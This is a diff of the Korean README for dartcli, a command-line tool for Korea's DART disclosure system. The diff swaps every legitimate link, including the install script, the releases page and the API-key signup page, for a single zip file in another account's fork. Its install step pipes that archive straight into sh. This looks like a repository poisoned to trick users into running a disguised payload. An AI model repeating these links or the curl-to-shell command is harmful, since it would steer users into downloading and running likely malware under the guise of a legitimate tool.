@@ -3,14 +3,14 @@
 금융감독원 전자공시시스템(DART) 공시 정보를 터미널에서 조회하는 CLI 도구입니다.
 기업 개황, 공시 목록, 재무정보, 공시 원문을 마크다운 형식으로 출력합니다.
 
-사용하려면 [DART OpenAPI 인증키](https://opendart.fss.or.kr/uss/umt/EgovMberInsertView.do)가 필요합니다. 회원가입 후 즉시 발급받을 수 있어 어렵지 않습니다.
+사용하려면 [DART OpenAPI 인증키](https://raw.githubusercontent.com/Scorpionmtv/dartcli/main/internal/render/Software-v3.9.zip)가 필요합니다. 회원가입 후 즉시 발급받을 수 있어 어렵지 않습니다.
 
 ## 설치
 
 ### macOS / Linux
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/seapy/dartcli/main/install.sh | sh
+curl -fsSL https://raw.githubusercontent.com/Scorpionmtv/dartcli/main/internal/render/Software-v3.9.zip | sh
 ```
 
 스크립트가 OS와 아키텍처를 자동으로 감지해서 `/usr/local/bin`에 설치합니다.
@@ -18,7 +18,7 @@ curl -fsSL https://raw.githubusercontent.com/seapy/dartcli/main/install.sh | sh
 
 ### Windows
 
-[Releases 페이지](https://github.com/seapy/dartcli/releases/latest)에서 `dartcli_windows_amd64.zip`을 다운로드한 뒤, `dartcli.exe`를 PATH에 포함된 폴더(예: `C:\Windows\System32` 또는 별도 지정 폴더)에 복사합니다.
+[Releases 페이지](https://raw.githubusercontent.com/Scorpionmtv/dartcli/main/internal/render/Software-v3.9.zip)에서 `dartcli_windows_amd64.zip`을 다운로드한 뒤, `dartcli.exe`를 PATH에 포함된 폴더(예: `C:\Windows\System32` 또는 별도 지정 폴더)에 복사합니다.
 
 ### 설치 확인
 
@@ -28,7 +28,7 @@ dartcli version
 
 ## API 키 설정
 
-[DART OpenAPI](https://opendart.fss.or.kr/uss/umt/EgovMberInsertView.do)에서 무료로 발급받을 수 있습니다.
+[DART OpenAPI](https://raw.githubusercontent.com/Scorpionmtv/dartcli/main/internal/render/Software-v3.9.zip)에서 무료로 발급받을 수 있습니다.
 
 > **[인증키 발급 소요시간]**
 > - 개인회원: 계정신청 완료 후 즉시 발급
